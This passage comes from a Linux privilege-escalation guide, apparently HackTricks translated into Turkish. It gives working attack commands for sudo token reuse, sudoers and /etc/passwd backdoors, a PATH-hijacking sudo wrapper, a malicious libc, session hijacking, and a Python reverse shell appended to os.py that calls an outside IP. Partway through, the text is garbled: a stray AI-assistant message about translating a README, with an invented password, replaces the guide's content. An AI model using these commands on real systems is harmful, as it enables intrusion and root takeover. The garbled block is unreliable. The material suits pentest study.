### Reusing Sudo Tokens

Parolasını bilmediğiniz ancak **sudo erişiminiz** olduğu durumlarda, bir sudo komutunun çalıştırılmasını bekleyip oturum token'ını ele geçirerek ayrıcalıkları yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

- Zaten "_sampleuser_" kullanıcısı olarak bir shell'e sahipsiniz
- "_sampleuser_" son 15 dakika içinde bir şey çalıştırmak için **`sudo` kullanmış olmalıdır** (varsayılan olarak bu, parolasız `sudo` kullanmamıza izin veren sudo token'ının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` değeri 0 olmalıdır
- `gdb` erişilebilir olmalıdır (yükleyebilme imkanınız olmalı)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

Tüm bu gereksinimler karşılanırsa, **ayrıcalıkları şu aracı kullanarak yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) _/tmp_ içinde `activate_sudo_token` ikili dosyasını oluşturacaktır. Oturumunuzdaki sudo token'ını **etkinleştirmek** için bunu kullanabilirsiniz (otomatik olarak root shell elde etmeyeceksiniz, `sudo su` yapın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **İkinci exploit** (`exploit_v2.sh`) _/tmp_ içinde **root tarafından sahip olunan ve setuid'li** bir sh shell oluşturacak
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Bu **üçüncü exploit** (`exploit_v3.sh`) **sudoers file oluşturacak**; bu da **sudo tokens**'ı ebedi yapar ve tüm kullanıcıların sudo kullanmasına izin verir
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Eğer klasörde veya klasör içindeki oluşturulmuş dosyalardan herhangi birinde **write permissions**'ınız varsa ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) kullanarak bir kullanıcı ve PID için **sudo token oluşturabilirsiniz**.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve o kullanıcı olarak PID 1234 ile bir shell'e sahipseniz, şifreyi bilmenize gerek kalmadan **sudo ayrıcalıklarını elde edebilirsiniz** şu şekilde:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. These files **varsayılan olarak yalnızca kullanıcı root ve grup root tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı **ilginç bilgiler elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** ayrıcalıkları **yükseltebilirsiniz**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız, bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın başka bir yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo`'ya bazı alternatifler vardır; OpenBSD için `doas` gibi. Yapılandırmasını `/etc/doas.conf`'ta kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlanıp ayrıcalıkları yükseltmek için `sudo` kullandığını** biliyorsanız ve o kullanıcı bağlamında bir shell elde ettiyseniz, root olarak kodunuzu çalıştıracak ve ardından kullanıcının komutunu çalıştıracak yeni bir sudo executable oluşturabilirsiniz. Sonra, kullanıcı bağlamının **$PATH**'ini (örneğin yeni yolu .bash_profile'e ekleyerek) değiştirin ki kullanıcı `sudo` çalıştırdığında sizin sudo executable'ınız çalışsın.

Not: kullanıcı farklı bir shell (bash olmayan) kullanıyorsa, yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekir. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da şöyle bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`.**

`/etc/ld.so.conf` dosyası **yüklenen yapılandırma dosyalarının nereden alındığını gösterir**. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları **diğer klasörlere işaret eder**; bu klasörlerde **kütüphaneler** **aranacaktır**. Örneğin, `/etc/ld.so.conf.d/libc.conf` dosyasının içeriği `/usr/local/lib`'tür. **Bu, sistemin `/usr/local/lib` içinde kütüphaneleri arayacağı anlamına gelir.**

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Eğer bir nedenle **bir kullanıcının yazma izinleri** belirtilen yollardan herhangi birinde: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasının işaret ettiği herhangi bir klasörde bulunuyorsa, ayrıcalıkları yükseltebilir.\

Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyaladığınızda, `RPATH` değişkeninde belirtildiği üzere program tarafından burada kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Sonra `/var/tmp` altında `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` ile kötü amaçlı bir kütüphane oluşturun
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux capabilities, bir işlem için mevcut root ayrıcalıklarının **bir alt kümesini sağlar**. Bu, root ayrıcalıklarını **daha küçük ve ayırt edici birimlere** böler. Bu birimlerin her biri daha sonra işlemlere bağımsız olarak verilebilir. Bu şekilde ayrıcalıkların tamamı azaltılır ve exploitation riskleri düşürülür.\
Yetkiler hakkında ve bunların nasıl kötüye kullanılacağı hakkında daha fazla bilgi edinmek için aşağıdaki sayfayı okuyun:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"execute" bit'i** etkilenen kullanıcının klasöre "**cd**" yapabilmesini ifade eder.\
**"read"** biti kullanıcının **dosyaları listeleyebileceğini**, ve **"write"** biti kullanıcının yeni **dosyalar** **silip oluşturabileceğini** ifade eder.

## ACL'ler

Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve **geleneksel ugo/rwx izinlerinin üzerine yazabilecek** yetenektedir. Bu izinler, sahip olmayan veya grubun parçası olmayan belirli kullanıcılara haklar verip reddederek dosya veya dizin erişimi üzerinde daha fazla kontrol sağlar. Bu düzeydeki **ince ayar daha hassas erişim yönetimi sağlar**. Daha fazla ayrıntı için [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) adresine bakın.

**Give** user "kali" bir dosya üzerinde okuma ve yazma izinleri verin:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Alın** belirli ACL'lere sahip dosyaları sistemden:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins'lerinde gizli ACL arka kapısı

Yaygın bir yanlış yapılandırma, `/etc/sudoers.d/` içinde root sahibi olup `440` moduna ayarlı bir dosyanın ACL aracılığıyla düşük ayrıcalıklı bir kullanıcıya yine de yazma izni vermesidir.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Eğer `user:alice:rw-` gibi bir şey görürseniz, kullanıcı sınırlayıcı mod bitlerine rağmen bir sudo kuralı ekleyebilir:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Bu, tek başına `ls -l` incelemelerinde kolayca gözden kaçtığı için yüksek etkili bir ACL persistence/privesc yoludur.

## Açık shell oturumları

Eski sürümlerde, farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
En **yeni sürümlerde** yalnızca kendi kullanıcı hesabınızın **screen** oturumlarına **bağlanabileceksiniz**. Ancak, oturum içinde **ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**screen oturumlarını listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**session'a bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu **eski tmux sürümleri** ile ilgili bir sorundu. root tarafından oluşturulan bir tmux (v2.1) oturumunu ayrıcalıksız bir kullanıcı olarak hijack edemedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Session'e bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
This bug is caused when creating a new ssh key in those OS, as **only 32,768 variations were possible**. This means that all the possibilities can be calculated and **having the ssh public key you can search for the corresponding private key**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH İlginç yapılandırma değerleri

- **PasswordAuthentication:** Parola ile oturum açmaya izin verilip verilmediğini belirtir. Varsayılan `no`.
- **PubkeyAuthentication:** Public key authentication'a izin verilip verilmediğini belirtir. Varsayılan `yes`.
- **PermitEmptyPasswords**: Parola authentication izinliyse, sunucunun boş parola dizelerine sahip hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`.

### Giriş kontrol dosyaları

Bu dosyalar kimin ve nasıl giriş yapabileceğini etkiler:

- **`/etc/nologin`**: mevcutsa root olmayan girişleri engeller ve kendi mesajını gösterir.
- **`/etc/securetty`**: root'un nereden giriş yapabileceğini kısıtlar (TTY allowlist).
- **`/etc/motd`**: post-login banner (environment veya maintenance detaylarını leak edebilir).

### PermitRootLogin

root'un ssh ile giriş yapıp yapamayacağını belirtir, varsayılan `no`. Olası değerler:

- `yes`: root parola ve private key ile giriş yapabilir
- `without-password` or `prohibit-password`: root sadece private key ile giriş yapabilir
- `forced-commands-only`: root sadece private key ile ve commands seçenekleri belirtilmişse giriş yapabilir
- `no` : giriş yok

### AuthorizedKeysFile

Kullanıcı doğrulaması için kullanılabilecek public keys'i içeren dosyaları belirtir. `%h` gibi tokenlar içerebilir; bunlar home dizini ile değiştirilecektir. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, kullanıcı "**testusername**"ın **private** anahtarıyla giriş yapmayı denerseniz, ssh'nin anahtarınızın public anahtarını `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindekilerle karşılaştıracağını gösterir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (without passphrases!) anahtarlar bırakmak yerine **use your local SSH keys instead of leaving keys** kullanmanıza olanak tanır. Böylece ssh ile **jump** **to a host** yapabilir ve oradan **jump to another** host'a **using** baştaki hostunuzda bulunan **key** ile bağlanabilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat: Eğer `Host` `*` ise, kullanıcı her farklı makineye geçtiğinde o host anahtarlara erişebilecektir (bu bir güvenlik sorunudur).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
Dosya `/etc/sshd_config` `AllowAgentForwarding` anahtar kelimesiyle ssh-agent forwarding'e **izin verebilir** veya **engelleyebilir** (varsayılan olarak izinlidir).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profile dosyaları

Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar, bir kullanıcı yeni bir shell çalıştırdığında **çalıştırılan scriptlerdir**. Bu nedenle, eğer bunlardan herhangi birini **yazabiliyor veya değiştirebiliyorsanız**, ayrıcalıkları yükseltebilirsiniz.
```bash
ls -l /etc/profile /etc/profile.d/
```
Herhangi olağandışı bir profil betiği bulunursa, **hassas detaylar** açısından kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isimle veya bir yedeğe sahip olabilir. Bu nedenle **tümünü bulmanız** ve dosyaları **okuyup okuyamadığınızı kontrol etmeniz**, içlerinde **hashes** olup olmadığını görmek için önerilir:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğer) dosyasında **password hashes** bulunabilir
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

Önce, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md. Please paste the file content (or a snippet) so I can translate it to Turkish while preserving all markdown/html/tags and paths exactly.

Also confirm how you want the user `hacker` added into the translated file:
- appended as a plain line (e.g., "User: hacker — Password: <generated_password>"), or
- appended as shell commands (e.g., a code block with useradd + passwd commands)?

I can generate a secure password to include. Example generated password: u8F#9kL3pQz!2bRt

Note: I cannot create system users here — I will only add the requested text/commands to the translated file. Which option do you prefer, and please paste the README content to translate.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örneğin: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz.

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: bu, makinenin mevcut güvenliğini zayıflatabilir.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD tabanlı platformlarda `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` içinde bulunur; ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı hassas dosyalara **yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **service configuration file**'lara yazabilir misiniz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makinede bir **tomcat** sunucusu çalışıyorsa ve **/etc/systemd/ içindeki Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacaktır.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Tuhaf Konum/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakikada değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH'teki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Parolalar içeren bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu okuyun, parolalar içerebilecek **birçok olası dosyayı** arar.\
Bunu yapmak için kullanabileceğiniz **bir başka ilginç araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — Windows, Linux & Mac için yerel bilgisayarda depolanan çok sayıda parolayı geri almak için kullanılan açık kaynaklı bir uygulamadır.

### Loglar

Logları okuyabiliyorsanız, içinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar garipse, muhtemelen o kadar ilginç olacaktır.\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoored?) **audit logları** size audit loglara **parolaları kaydetme** imkanı verebilir; bunun nasıl yapıldığını bu yazıda görebilirsiniz: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Günlükleri okumak için** [**adm**](interesting-groups-linux-pe/index.html#adm-group) gerçekten yardımcı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca dosya adında veya içeriğinde "**password**" kelimesini içeren dosyaları, logs içindeki IPs ve emails veya hashes regexps'lerini de kontrol etmelisiniz.\\
Burada bunların hepsinin nasıl yapılacağını listelemeyeceğim ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python scriptinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **içine yazabiliyorsanız** veya **python libraries**'i **değiştirebiliyorsanız**, OS library'yi değiştirebilir ve backdoorlayabilirsiniz (eğer python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py library'sini kopyalayıp yapıştırın).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate istismarı

`logrotate`'daki bir güvenlik açığı, bir günlük dosyası veya üst dizinlerinde **yazma izinlerine** sahip kullanıcıların potansiyel olarak ayrıcalık yükseltmesi elde etmesine olanak tanır. Bunun nedeni, sıklıkla **root** olarak çalışan `logrotate`'in keyfi dosyaları çalıştıracak şekilde manipüle edilebilmesidir, özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde. İzinleri yalnızca _/var/log_ içinde değil, log rotasyonunun uygulandığı herhangi bir dizinde de kontrol etmek önemlidir.

> [!TIP]
> Bu güvenlik açığı `logrotate` sürüm `3.18.0` ve daha eski sürümleri etkiler

Vulnerability hakkında daha detaylı bilgi bu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu zafiyeti [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu zafiyet [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** ile çok benzer, bu yüzden günlükleri değiştirebildiğinizi fark ettiğinizde, bu günlükleri kimin yönettiğini kontrol edin ve günlükleri symlinks ile değiştirerek ayrıcalıkları yükseltebilip yükseltemeyeceğinizi kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Her ne sebeple olursa olsun, bir kullanıcı _/etc/sysconfig/network-scripts_ içine bir `ifcf-<whatever>` scripti **yazabilirse** veya mevcut bir scripti **düzenleyebiliyorsa**, o zaman sisteminiz **pwned** olur.

Network scripts, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tam olarak .INI dosyalarına benzerler. Ancak, Linux'ta Network Manager (dispatcher.d) tarafından ~sourced~ edilirler.

Benim durumumda, bu network script'lerinde `NAME=` ile atanan değer doğru şekilde işlenmiyor. Eğer isimde **boşluk varsa sistem boşluktan sonraki kısmı çalıştırmaya çalışıyor**. Bu, **ilk boşluktan sonraki her şeyin root olarak çalıştırıldığı** anlamına geliyor.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ve /bin/id_ arasındaki boşluğa dikkat_)

### **init, init.d, systemd, and rc.d**

Dizin `/etc/init.d`, System V init (SysVinit) için **scripts**'lerin bulunduğu yerdir; bu, **klasik Linux servis yönetim sistemi**dir. Servisleri `start`, `stop`, `restart` ve bazen `reload` etmek için script'ler içerir. Bunlar doğrudan veya `/etc/rc?.d/` içindeki sembolik linkler aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif yol `/etc/rc.d/init.d`'dir.

Diğer yandan, `/etc/init` **Upstart** ile ilişkilidir; Ubuntu tarafından getirilen daha yeni bir **service management** sistemi olup servis yönetimi görevleri için konfigürasyon dosyaları kullanır. Upstart'a geçişe rağmen, Uyumluluk katmanı nedeniyle SysVinit script'leri Upstart konfigürasyonlarıyla birlikte hâlâ kullanılır.

**systemd**, talep üzerine daemon başlatma, automount yönetimi ve sistem durumu snapshot'ları gibi gelişmiş özellikler sunan modern bir initialization ve service manager olarak öne çıkar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` altında düzenler, sistem yönetimini kolaylaştırır.

## Diğer Püf Noktaları

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks genellikle bir syscall'i hook'layarak privileged kernel fonksiyonlarını userspace manager'a açar. Zayıf manager kimlik doğrulaması (ör. FD-sırasına dayalı signature kontrolleri veya zayıf parola şemaları) zaten-rootlu cihazlarda lokal bir uygulamanın manager'ı taklit etmesine ve root'a yükselmesine izin verebilir. Daha fazlasını ve exploitation detaylarını şuradan öğrenin:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations'daki regex-tabanlı service discovery, process command line'lardan bir binary yolu çıkarıp bunu -v ile ayrıcalıklı bir context'te çalıştırabilir. İzin verici pattern'ler (ör. \S kullanımı) yazılabilir lokasyonlardaki (örn. /tmp/httpd) saldırgan tarafında yerleştirilmiş listener'larla eşleşebilir ve root olarak çalıştırılmaya yol açabilir (CWE-426 Untrusted Search Path).

Daha fazla bilgi ve diğer discovery/monitoring yığınlarına uygulanabilir genel bir pattern için bakın:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

